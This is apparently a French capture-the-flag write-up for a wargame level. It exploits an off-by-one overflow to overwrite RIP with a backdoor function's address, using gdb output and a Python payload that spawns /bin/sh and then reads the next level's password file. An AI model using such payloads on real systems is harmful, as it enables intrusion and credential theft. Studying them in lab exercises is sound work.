L'objectif de ce niveau est d'exploiter une faille "off-by-one". Le principe est qu'une boucle dans le programme va un element trop loin, et nous permet d'ecrire au dela d'un buffer.

Dans la fonction set_username, une boucle va 1 byte trop loin et nous permet d'overwrite une valeur qui va servir de length pour un strncpy dans set_msg.

Cela va nous permettre d'ecrire les valeurs que l'on veut dans RIP. Ici, on va ecrire l'adresse de la fonction secret_backdoor dans RIP, qui va ensuite executer un system de ce qu'on lui passe dans stdin.

## Trouver RIP
```
(gdb) disas handle_msg
Dump of assembler code for function handle_msg:
   0x00000000000008c0 <+0>:	push   %rbp
   0x00000000000008c1 <+1>:	mov    %rsp,%rbp
   0x00000000000008c4 <+4>:	sub    $0xc0,%rsp
   0x00000000000008cb <+11>:	lea    -0xc0(%rbp),%rax
```
push %rbp       -> 8 bytes
sub  $0xc0,%rsp -> 192 bytes
RIP -> 200 bytes

RIP -> 200 bytes + 12 bytes pour l'adresse -> 212 = 0xd4

## Trouver l'adresse de secret_backdoor
```
(gdb) run
Starting program: /home/users/level09/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b01f30 in read () from /lib/x86_64-linux-gnu/libc.so.6
(gdb) p secret_backdoor
$2 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

## L'injection
```
> python -c "print 'a' * 40 + '\xd4' + '\n' + 'b' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '/bin/sh'" > /tmp/level09.txt
> cat /tmp/level09 - | ./level09
> cat /home/users/end/.pass
```
